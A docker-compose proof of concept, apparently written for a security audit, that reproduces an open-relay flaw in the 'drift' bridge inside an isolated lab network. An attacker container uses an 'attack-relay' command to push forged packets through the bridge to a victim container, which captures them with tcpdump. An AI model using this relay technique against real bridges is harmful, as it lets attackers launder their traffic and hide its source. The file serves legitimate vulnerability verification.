# Open-relay PoC. See SEC.AUDIT.1.
#
# Topology: bridge=10.99.0.10  victim=10.99.0.20  attacker=10.99.0.99
#
# Attacker sends UDP packets from 10.99.0.99 to bridge with
# crafted DRIFT header (dst_id = victim_peer_id, hop_ttl=8).
# Bridge forwards the packet to victim. Victim sees source IP =
# 10.99.0.10 (bridge), NOT 10.99.0.99 (attacker). That's the
# open-relay — the bridge laundered the attacker's traffic.

services:
  bridge:
    image: drift-sec:latest
    container_name: sec-bridge
    networks: { secnet: { ipv4_address: 10.99.0.10 } }
    volumes: [./keys:/keys:ro]
    environment: { RUST_LOG: "info,drift::transport=debug,drift::transport::mesh=debug" }
    command: ["drift", "--identity", "/keys/bridge.key", "bridge", "--listen", "udp://0.0.0.0:51820"]

  victim:
    image: drift-sec:latest
    container_name: sec-victim
    depends_on: [bridge]
    networks: { secnet: { ipv4_address: 10.99.0.20 } }
    cap_add: [NET_ADMIN]
    volumes: [./keys:/keys:ro]
    environment: { RUST_LOG: "info,drift=info" }
    command:
      - sh
      - -c
      - |
        sleep 3
        drift-mosh-server \
          --identity-file /keys/victim.hex \
          --bridge "udp://10.99.0.10:51820@fa1789b7e285be2396de6f53a21f2f9d161725dc8265cc7f4019541acf73180a" \
          > /tmp/victim.log 2>&1 &
        sleep 4
        echo "=== victim federated; capturing inbound UDP ==="
        # capture to file so we can grep later
        tcpdump -i any -nn -X -s 0 -w /tmp/victim.pcap 'udp' 2>/dev/null &
        TPID=$$!
        sleep 22
        kill -INT $$TPID 2>/dev/null
        sleep 1
        echo ""
        echo "==============================================="
        echo "=== POST-MORTEM: grep for attacker payload ==="
        echo "==============================================="
        # Look at the .pcap for our forged payload bytes "FORGED-OPENRELAY"
        tcpdump -r /tmp/victim.pcap -nn -X 2>/dev/null \
          | awk 'BEGIN{print_match=0} /^[0-9]+:[0-9]+:/ {if(print_match) print "----"; print_match=0; cur=$$0; lines=""} {lines=lines"\n"$$0; if(/FORGED|OPENRELAY/) print_match=1} END{if(print_match) {print "----"; print cur lines}}' \
          | head -80
        echo ""
        echo "=== count of packets from each source to victim ==="
        tcpdump -r /tmp/victim.pcap -nn 2>/dev/null \
          | grep -oE '10\.99\.0\.[0-9]+\.[0-9]+' | sort | uniq -c | sort -rn | head

  attacker:
    image: drift-sec:latest
    container_name: sec-attacker
    depends_on: [victim]
    networks: { secnet: { ipv4_address: 10.99.0.99 } }
    command:
      - sh
      - -c
      - |
        sleep 12
        echo ""
        echo "=================================================="
        echo "=== ATTACKER 10.99.0.99 → BRIDGE 10.99.0.10 ==="
        echo "=================================================="
        attack-relay relay \
          --bridge 10.99.0.10:51820 \
          --victim-pub a4a05b9ab50f42340d9c796f55cf3482cf65a73c33d9e07cbf38c9cb012f8d28 \
          --count 5 \
          --body "FORGED-OPENRELAY-PoC-from-attacker-10.99.0.99" \
          --hop-ttl 8
        sleep 10

networks:
  secnet:
    driver: bridge
    ipam: { config: [{ subnet: 10.99.0.0/24 }] }
